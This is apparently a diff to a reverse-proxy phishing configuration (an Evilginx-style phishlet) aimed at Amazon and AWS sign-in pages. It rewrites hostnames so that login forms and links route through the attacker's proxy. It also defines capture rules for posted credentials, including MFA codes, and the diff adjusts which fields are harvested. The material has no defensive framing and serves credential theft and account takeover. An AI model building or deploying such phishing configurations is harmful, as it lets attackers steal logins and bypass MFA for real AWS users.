@@ -60,7 +60,7 @@ sub_filters:
   - {triggers_on: 'fls-na.amazon.com', orig_sub: 'fls-na', domain: 'amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
   - {triggers_on: 'fls-na.amazon.com', orig_sub: 'fls-na', domain: 'amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
   - {triggers_on: 'images-na.ssl-iamges-amazon.com', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
-  - {triggers_on: 'images-na.ssl-iamges-amazon.com', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']} 
+  - {triggers_on: 'images-na.ssl-iamges-amazon.com', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
   - {triggers_on: 'console.aws.amazon.com', orig_sub: 'console.aws', domain: 'amazon.com', search: '"https://{hostname}', replace: '"https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
   - {triggers_on: 'signin.aws.amazon.com', orig_sub: 'signin.aws', domain: 'amazon.com', search: '"https://{hostname}', replace: '"https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
   - {triggers_on: 'signin.aws.amazon.com', orig_sub: 'signin.aws', domain: 'amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json'], redirect_only: true}
@@ -147,11 +147,8 @@ credentials:
   - key: 'aws-mfa-entered'
     search: '(.*)'
     type: 'post'
-  - key: 'aws-account-alias'
-    search: '(.*)'
-    type: 'post'
   - key: ''
-    search: '([^"]*)'ses
+    search: '([^"]*)'
     type: 'json'
 
 login :
